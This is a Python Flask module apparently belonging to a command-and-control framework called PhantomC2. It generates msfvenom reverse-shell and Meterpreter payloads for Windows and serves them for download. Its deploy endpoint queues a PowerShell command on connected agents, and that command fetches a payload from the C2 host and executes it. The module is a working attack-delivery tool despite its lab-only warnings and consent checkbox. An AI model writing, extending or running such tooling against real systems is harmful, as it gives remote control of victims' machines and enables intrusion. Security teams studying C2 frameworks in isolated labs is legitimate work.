# payload_builder.py
# Lab-only msfvenom payload generator + T1105 delivery module.

import os
import sys
import subprocess
import shutil
import socket
import datetime
from flask import Blueprint, request, jsonify, send_from_directory, render_template_string

payload_bp = Blueprint('payload_bp', __name__)

PAYLOAD_DIR = "generated_payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)

def get_lan_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def msfvenom_available():
    return shutil.which("msfvenom") is not None

def get_server_state():
    main_mod = sys.modules.get('__main__')
    if main_mod and hasattr(main_mod, 'agents'):
        return main_mod.agents, getattr(main_mod, 'killed_agents', set())
    return None, None

PAYLOAD_TYPES = {
    "windows/x64/meterpreter/reverse_tcp":    {"label": "Windows x64 Meterpreter (TCP)",      "ext": "exe", "format": "exe"},
    "windows/meterpreter/reverse_tcp":        {"label": "Windows x86 Meterpreter (TCP)",      "ext": "exe", "format": "exe"},
    "windows/x64/meterpreter/reverse_https":  {"label": "Windows x64 Meterpreter (HTTPS)",    "ext": "exe", "format": "exe"},
    "windows/x64/shell_reverse_tcp":          {"label": "Windows x64 Plain Shell (TCP)",      "ext": "exe", "format": "exe"},
    "windows/x64/powershell_reverse_tcp":     {"label": "Windows x64 PowerShell Reverse TCP", "ext": "ps1", "format": "ps1"},
    "windows/x64/meterpreter/reverse_tcp_rc4": {"label": "Windows x64 Meterpreter RC4",       "ext": "exe", "format": "exe"},
}

@payload_bp.route('/payload-builder')
def payload_builder_page():
    return render_template_string(
        PAYLOAD_BUILDER_HTML,
        payload_types=PAYLOAD_TYPES,
        default_lhost=get_lan_ip(),
        msfvenom_ok=msfvenom_available()
    )

@payload_bp.route('/api/generate-payload', methods=['POST'])
def generate_payload():
    data = request.json or {}

    if not data.get("consent"):
        return jsonify({"error": "Consent required: confirm this is for an isolated lab VM you own."}), 400
    if not msfvenom_available():
        return jsonify({"error": "msfvenom not found in PATH."}), 500

    payload_type = data.get("payload_type")
    lhost = str(data.get("lhost", "")).strip()
    lport = str(data.get("lport", "")).strip()
    name  = str(data.get("name") or f"lab_payload_{int(datetime.datetime.now().timestamp())}").strip()
    safe_name = "".join(c for c in name if c.isalnum() or c in "-_") or "payload"

    if payload_type not in PAYLOAD_TYPES:
        return jsonify({"error": "Unknown payload type"}), 400
    if not lhost or not lport:
        return jsonify({"error": "LHOST and LPORT required"}), 400
    if not lport.isdigit() or not (1 <= int(lport) <= 65535):
        return jsonify({"error": "LPORT must be 1-65535"}), 400

    info = PAYLOAD_TYPES[payload_type]
    outfile = os.path.join(PAYLOAD_DIR, f"{safe_name}.{info['ext']}")

    cmd = ["msfvenom", "-p", payload_type, f"LHOST={lhost}", f"LPORT={lport}", "-f", info["format"], "-o", outfile]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    except subprocess.TimeoutExpired:
        return jsonify({"error": "msfvenom timed out"}), 500

    if result.returncode != 0 or not os.path.exists(outfile):
        return jsonify({
            "error": "msfvenom failed",
            "stderr": result.stderr[-1500:],
            "stdout": result.stdout[-1500:]
        }), 500

    size = os.path.getsize(outfile)
    download_url = f"/download/{os.path.basename(outfile)}"
    listener_cmd = (
        f"msfconsole -q -x 'use exploit/multi/handler; "
        f"set PAYLOAD {payload_type}; set LHOST {lhost}; set LPORT {lport}; "
        f"set ExitOnSession false; exploit -j'"
    )

    print(f"[PAYLOAD] Generated {outfile} ({size} bytes) LHOST={lhost} LPORT={lport}")

    return jsonify({
        "status": "ok",
        "file": os.path.basename(outfile),
        "size": size,
        "download_url": download_url,
        "lhost": lhost,
        "lport": lport,
        "payload_type": payload_type,
        "listener_cmd": listener_cmd,
        "warning": "Default msfvenom payloads are detected by Windows Defender."
    })

@payload_bp.route('/download/<path:filename>')
def download_payload(filename):
    filename = os.path.basename(filename)
    filepath = os.path.join(PAYLOAD_DIR, filename)
    if not os.path.exists(filepath):
        return "File not found", 404
    return send_from_directory(PAYLOAD_DIR, filename, as_attachment=True)

@payload_bp.route('/api/payloads')
def list_payloads():
    files = []
    if os.path.isdir(PAYLOAD_DIR):
        for f in os.listdir(PAYLOAD_DIR):
            p = os.path.join(PAYLOAD_DIR, f)
            if os.path.isfile(p):
                files.append({
                    "name": f,
                    "size": os.path.getsize(p),
                    "created": datetime.datetime.fromtimestamp(os.path.getctime(p)).strftime("%Y-%m-%d %H:%M:%S"),
                    "download_url": f"/download/{f}"
                })
    files.sort(key=lambda x: x["created"], reverse=True)
    return jsonify(files)

@payload_bp.route('/api/delete-payload/<path:filename>', methods=['POST'])
def delete_payload(filename):
    filename = os.path.basename(filename)
    filepath = os.path.join(PAYLOAD_DIR, filename)
    if os.path.exists(filepath):
        os.remove(filepath)
        return jsonify({"status": "deleted"})
    return jsonify({"error": "not found"}), 404

@payload_bp.route('/api/deploy/<agent_id>/<path:filename>', methods=['POST'])
def deploy_payload(agent_id, filename):
    """Queue a T1105 command on a connected agent to download and run a payload."""
    agents, killed_agents = get_server_state()
    if agents is None:
        return jsonify({"error": "server state unavailable"}), 500

    if agent_id in killed_agents:
        return jsonify({"error": "agent is terminated"}), 400
    if agent_id not in agents:
        return jsonify({"error": "agent not connected"}), 404

    filename = os.path.basename(filename)
    filepath = os.path.join(PAYLOAD_DIR, filename)
    if not os.path.exists(filepath):
        return jsonify({"error": "payload not found"}), 404

    download_url = f"http://__C2__/download/{filename}"
    cmd = (
        f"$url = '{download_url}'; "
        f"$out = \"$env:TEMP\\{filename}\"; "
        f"try {{ "
        f"Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing; "
        f"Start-Process $out; "
        f"'PAYLOAD_EXECUTED' "
        f"}} catch {{ "
        f"'PAYLOAD_BLOCKED: ' + $_.Exception.Message "
        f"}}"
    )

    agents[agent_id]["queue"].append("T1105")
    agents[agent_id].setdefault("_deploy_overrides", {})["T1105"] = cmd

    print(f"[DEPLOY] Queued {filename} for agent {agent_id}")
    return jsonify({"status": "queued", "filename": filename, "agent": agent_id})


PAYLOAD_BUILDER_HTML = '''
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Payload Builder — Lab Only</title>
<style>
:root { --bg:#0a0e14; --bg-2:#11161d; --bg-3:#1a2029; --border:#2a323d; --text:#d4dae3; --text-dim:#7d8590; --accent:#00d4ff; --accent-2:#7c3aed; --green:#22c55e; --yellow:#eab308; --red:#ef4444; --orange:#f97316; }
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Inter', -apple-system, 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); padding: 24px; }
h1 { color: var(--accent); margin-bottom: 8px; font-size: 22px; }
h2 { color: var(--accent); font-size: 15px; margin: 20px 0 12px; }
.subtitle { color: var(--text-dim); font-size: 13px; margin-bottom: 20px; }
.warn-box { background: rgba(234,179,8,0.1); border: 1px solid var(--yellow); border-radius: 8px; padding: 14px; margin-bottom: 20px; font-size: 13px; color: var(--yellow); }
.panel { background: var(--bg-2); border: 1px solid var(--border); border-radius: 10px; padding: 20px; margin-bottom: 20px; max-width: 720px; }
label { display: block; font-size: 12px; color: var(--text-dim); margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
input, select { width: 100%; background: var(--bg); border: 1px solid var(--border); color: var(--text); padding: 10px 12px; border-radius: 6px; font-size: 13px; font-family: inherit; margin-bottom: 14px; }
input:focus, select:focus { outline: none; border-color: var(--accent); }
.row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
.btn { padding: 10px 18px; border: none; border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; font-family: inherit; }
.btn-primary { background: var(--accent); color: #000; }
.btn-primary:hover { background: #33ddff; }
.btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
.btn-ghost { background: transparent; color: var(--text-dim); border: 1px solid var(--border); margin-left: 8px; }
.checkbox-row { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 16px; }
.checkbox-row input { width: auto; margin: 3px 0 0 0; }
.checkbox-row label { text-transform: none; font-size: 13px; color: var(--text); letter-spacing: 0; margin-bottom: 0; }
pre { background: var(--bg); padding: 12px; border-radius: 6px; font-size: 12px; color: #7ee787; border: 1px solid var(--border); white-space: pre-wrap; word-break: break-all; margin-bottom: 10px; }
.result-box { background: var(--bg-3); border: 1px solid var(--green); border-radius: 8px; padding: 16px; margin-top: 20px; }
.result-box h3 { color: var(--green); font-size: 14px; margin-bottom: 10px; }
.result-box .meta { font-size: 12px; color: var(--text-dim); margin-bottom: 8px; }
.payload-list { display: flex; flex-direction: column; gap: 8px; }
.payload-item { display: flex; justify-content: space-between; align-items: center; background: var(--bg-3); padding: 10px 14px; border-radius: 6px; font-size: 12px; border: 1px solid var(--border); }
.payload-item a { color: var(--accent); text-decoration: none; }
.copy-btn { background: var(--accent-2); color: white; padding: 5px 12px; border-radius: 4px; border: none; cursor: pointer; font-size: 11px; }
.back-link { display: inline-block; margin-bottom: 20px; color: var(--accent); text-decoration: none; font-size: 13px; }
</style>
</head>
<body>
<a class="back-link" href="/">← Back to PhantomC2 Dashboard</a>
<h1>⚙️ Payload Builder (Lab Only)</h1>
<p class="subtitle">Generate msfvenom payloads and deploy them via T1105 to connected agents.</p>

{% if not msfvenom_ok %}
<div class="warn-box" style="background: rgba(239,68,68,0.1); border-color: var(--red); color: var(--red);">
⚠️ <strong>msfvenom not found.</strong> Run: <code>sudo apt install metasploit-framework</code>
</div>
{% endif %}

<div class="warn-box">
⚠️ <strong>Lab use only.</strong> Payloads generated here must only be deployed to VMs you own or have written authorization to test. Deploying to any other system is a criminal offense.
</div>

<div class="panel">
<h2>Generate Payload</h2>
<form id="genForm">
<label>Payload Type</label>
<select id="payload_type">
{% for key, val in payload_types.items() %}
<option value="{{ key }}">{{ val.label }}</option>
{% endfor %}
</select>

<div class="row">
<div><label>LHOST</label><input type="text" id="lhost" value="{{ default_lhost }}"></div>
<div><label>LPORT</label><input type="text" id="lport" value="4444"></div>
</div>

<label>Filename</label>
<input type="text" id="name" value="lab_payload">

<div class="checkbox-row">
<input type="checkbox" id="consent">
<label for="consent">I confirm this payload is for an isolated lab VM I own or have authorization to test.</label>
</div>

<button type="submit" class="btn btn-primary" {% if not msfvenom_ok %}disabled{% endif %}>🔨 Generate Payload</button>
<button type="button" class="btn btn-ghost" onclick="refreshList()">↻ Refresh</button>
</form>
<div id="result"></div>
</div>

<div class="panel">
<h2>Existing Payloads</h2>
<div id="payloadList" class="payload-list"><p style="color: var(--text-dim); font-size: 13px;">Loading...</p></div>
</div>

<script>
document.getElementById('genForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const result = document.getElementById('result');
  result.innerHTML = '<p style="color: var(--text-dim);">⏳ Generating...</p>';
  const data = {
    payload_type: document.getElementById('payload_type').value,
    lhost: document.getElementById('lhost').value,
    lport: document.getElementById('lport').value,
    name: document.getElementById('name').value,
    consent: document.getElementById('consent').checked
  };
  try {
    const res = await fetch('/api/generate-payload', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(data) });
    const j = await res.json();
    if (j.error) {
      result.innerHTML = '<div class="warn-box" style="background: rgba(239,68,68,0.1); border-color: var(--red); color: var(--red);">❌ ' + j.error + '</div>';
      return;
    }
    result.innerHTML = `
      <div class="result-box">
        <h3>✅ Payload Generated</h3>
        <div class="meta">File: <strong>${j.file}</strong> (${j.size} bytes)</div>
        <div class="meta">LHOST: ${j.lhost} | LPORT: ${j.lport}</div>
        <p style="font-size: 12px; color: var(--text-dim); margin-top: 12px;">Start listener:</p>
        <pre id="listenerCmd">${j.listener_cmd}</pre>
        <button class="copy-btn" onclick="copyListener()">📋 Copy Listener Command</button>
        <div class="warn-box" style="margin-top: 16px; font-size: 12px;">${j.warning}</div>
      </div>`;
    refreshList();
  } catch (err) {
    result.innerHTML = '<div class="warn-box" style="background: rgba(239,68,68,0.1); border-color: var(--red); color: var(--red);">❌ ' + err.message + '</div>';
  }
});

function copyListener() {
  const cmd = document.getElementById('listenerCmd').innerText;
  navigator.clipboard.writeText(cmd).then(()=>alert('Copied!')).catch(()=>alert('Copy failed'));
}

async function refreshList() {
  const list = document.getElementById('payloadList');
  try {
    const res = await fetch('/api/payloads');
    const files = await res.json();
    if (!files.length) { list.innerHTML = '<p style="color: var(--text-dim); font-size: 13px;">No payloads yet.</p>'; return; }
    list.innerHTML = files.map(f => `
      <div class="payload-item">
        <span><strong>${f.name}</strong> — ${f.size} bytes — ${f.created}</span>
        <span><a href="${f.download_url}">⬇ Download</a></span>
      </div>`).join('');
  } catch (e) {
    list.innerHTML = '<p style="color: var(--red);">Failed to load</p>';
  }
}
refreshList();
</script>
</body>
</html>
'''
